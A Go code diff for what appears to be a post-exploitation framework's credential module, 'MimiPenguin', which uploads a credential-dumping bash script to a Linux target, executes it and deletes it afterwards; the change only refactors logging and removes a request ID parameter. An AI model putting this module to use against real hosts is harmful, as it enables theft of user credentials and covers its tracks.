@@ -45,7 +45,7 @@ var modLog = log.ServerLogger("post/linux/x64/bash/credentials/MimiPenguin", "mo
 
 // [ Module Methods ] ------------------------------------------------------------------------//
 
-func (s *MimiPenguin) Run(requestID int32, command string) (result string, err error) {
+func (s *MimiPenguin) Run(command string) (result string, err error) {
 
 	// Check options
 	if ok, err := s.CheckRequiredOptions(); !ok {
@@ -64,34 +64,31 @@ func (s *MimiPenguin) Run(requestID int32, command string) (result string, err e
 	timeout := time.Second * 30
 
 	// Upload MimiPenguin script on target
-	upload := fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value)
-	s.ModuleEvent(requestID, upload)
+	s.ModuleEvent(fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value))
 	result, err = s.Upload(src, rpath, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		s.ModuleEvent(requestID, result)
+		s.ModuleEvent(result)
 	}
 
 	// Execute Script
-	running := fmt.Sprintf("Running script ...")
-	s.ModuleEvent(requestID, running)
+	s.ModuleEvent("Running script ...")
 	time.Sleep(time.Millisecond * 500)
 	result, err = s.Execute(rpath, []string{}, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		s.ModuleEvent(requestID, result)
+		s.ModuleEvent(result)
 	}
 
 	// Delete script
-	deleting := fmt.Sprintf("Deleting script ...")
-	s.ModuleEvent(requestID, deleting)
+	s.ModuleEvent("Deleting script ...")
 	result, err = s.Remove(rpath, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		s.ModuleEvent(requestID, result)
+		s.ModuleEvent(result)
 	}
 
 	return "Module executed", nil
